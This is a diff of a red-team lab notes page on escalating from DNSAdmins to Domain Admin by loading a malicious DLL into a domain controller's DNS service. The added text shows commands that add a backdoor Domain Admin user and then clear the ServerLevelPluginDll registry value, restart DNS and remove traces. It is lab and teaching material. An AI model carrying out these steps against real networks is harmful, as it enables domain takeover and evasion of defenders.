@@ -75,7 +75,7 @@ After checking the DNS logs I saw the below error, suggesting there was somethin
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-11-21-45-51.png)
 
-I tried exporting functions with C++ name mangling and without and although the DLL exports seemed to be OK per CFF Explorer, I was still not able to pull this attack completely...
+I tried exporting functions with C++ name mangling and without and although the DLL exports seemed to be OK per CFF Explorer, I was still not able to make DC send a reverse shell back to my attacking system:
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-11-21-46-09.png)
 
@@ -83,15 +83,59 @@ I tried exporting functions with C++ name mangling and without and although the 
 Although I was not able to pull the attack in my labs, I did not want to remove these notes, just in case the they will be stubmled upon by a reader who had successfully carried out this attack and who would like to share their thoughts on what I am overlooking - this would be much appreciated.
 {% endhint %}
 
-Although I could not get my DLL loaded, I tried injecting the meterpreter DLL into dns.exe using the same technique. 
+Although I could not get my DLL loaded, I wanted to try injecting the meterpreter DLL into dns.exe using the same technique. 
 
 It can be observed, that the DLL gets ineed loaded and we receive a call back from the meterpreter payload, but since the DLL does not conform to the required format \(does not have required exported functions\), the session dies immediately:
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-11-22-33-58.png)
 
+Since the above suggests that the the DLL code still got executed, we can try asking the DLL to execute the following on the DC:
 
+```csharp
+net group 'domain admins' spotless /add /domain
+```
 
+```text
+dnsprivesc.dll
+```
 
+![](../../.gitbook/assets/screenshot-from-2018-11-11-22-55-35.png)
+
+Before restarting the DNS service and getting our malicious DLL executed, let's make sure our attacking user spotless is not in `Domain Admins` group:
+
+![](../../.gitbook/assets/screenshot-from-2018-11-11-23-03-40.png)
+
+Now if we restart the DNS service which will load our addDA.dll, we see that the user spotless is now a member of the `Domain Admins`:
+
+![](../../.gitbook/assets/screenshot-from-2018-11-11-23-03-52.png)
+
+{% hint style="danger" %}
+Warning: at this time the DNS service is probably crashed, so this is not the stealthiest methods and probably will get picked up by defenders real quick unless you can restore the DNS service immedialy.
+{% endhint %}
+
+Below confirms that the dns service is down, but we can still access the DC C$ share by DC's IP:
+
+![](../../.gitbook/assets/screenshot-from-2018-11-11-23-09-23.png)
+
+You could think about scripting/automating the after-attack cleanup and DNS service restoration and include the required code in the same malicious DLL that creates a backdoor user in the first place:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
+```csharp
+reg query \\10.0.0.6\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+reg delete \\10.0.0.6\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+sc.exe \\10.0.0.6 stop dns
+sc.exe \\10.0.0.6 start dns
+//remove any other traces/logs
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+![](../../.gitbook/assets/screenshot-from-2018-11-11-23-21-55.png)
+
+We can now access the C$ using DC01 computer name:
+
+![](../../.gitbook/assets/screenshot-from-2018-11-11-23-24-44.png)
 
 ## References
 
